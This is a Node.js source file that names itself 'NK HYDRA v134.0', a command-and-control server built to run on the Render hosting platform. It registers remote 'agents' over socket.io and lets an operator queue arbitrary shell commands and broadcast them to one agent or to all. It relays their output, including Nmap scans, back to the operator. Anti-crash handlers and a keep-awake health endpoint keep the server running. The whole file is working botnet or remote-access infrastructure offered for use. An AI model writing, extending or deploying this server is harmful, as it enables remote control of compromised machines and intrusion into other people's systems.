// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v134.0 [STABLE QUEUE + SINGULARITY SUPPORT + ANTI-CRASH]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// --- ANTI-CRASH HANDLERS (CRITICAL) ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception:', err);
    // Do NOT exit process on Render
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection:', reason);
});

const app = express();
app.use(cors());

// Health Check Endpoint for Ping Services (Keep Render Awake)
app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ 
        status: 'online', 
        version: 'v134.0', 
        agents: agents.length,
        queue: commandQueue.length
    }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 25000, 
    pingTimeout: 60000,
    maxHttpBufferSize: 1e8, // 100MB Limit (Prevents crash on large Nmap output)
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
let isProcessingQueue = false;

// --- QUEUE PROCESSOR ---
const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         try {
                             io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                         } catch (err) {
                             console.error("Socket Emit Failed (Agent likely disconnected):", err);
                         }
                    }
                }
            } catch (e) {
                console.error("Queue Exec Error:", e);
            }
        }
        // Throttle to prevent flooding
        await new Promise(r => setTimeout(r, 200)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    // --- HEARTBEAT HANDLER ---
    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });

    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                socket.emit('agents_list', agents);
                return;
            }

            // Remove existing agent with same ID (reconnection)
            agents = agents.filter(a => a.id !== data.id);
            
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
            
            io.to('ui_room').emit('agents_list', agents);
            console.log(`[+] Agent Online: ${data.id}`);
            
            // Re-process queue if agents come online
            if(commandQueue.length > 0) processQueue();

        } catch (e) {
            console.error("Identify Error:", e);
        }
    });

    socket.on('exec_cmd', (data) => {
        try {
            const { targetId, cmd } = data;
            const id = Date.now().toString(); // Command ID
            commandQueue.push({ targetId, cmd, id });
            
            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
            processQueue();

        } catch (e) { console.error("Exec Error:", e); }
    });
    
    socket.on('agent_event', (data) => {
        try {
            io.to('ui_room').emit('agent_event', data);
        } catch (e) { console.error("Relay Error:", e); }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v134 LISTENING ON ${PORT}`));
